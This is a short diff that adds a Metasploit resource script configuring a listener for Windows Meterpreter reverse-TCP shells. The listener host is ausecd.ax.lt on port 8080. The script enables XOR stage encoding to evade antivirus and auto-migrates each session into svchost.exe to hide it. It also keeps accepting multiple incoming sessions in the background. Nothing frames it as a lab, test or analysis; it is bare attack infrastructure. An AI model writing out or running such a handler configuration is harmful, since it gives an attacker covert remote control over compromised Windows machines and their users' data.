@@ -1,0 +1,11 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST ausecd.ax.lt
+set LPORT 8080
+set EnableStageEncoding true
+set StageEncoder x86/call4_dword_xor
+set AutoRunScript migrate -n svchost.exe
+set AutoSysInfo true
+set VERBOSE true
+set ExitOnSession false
+exploit -j
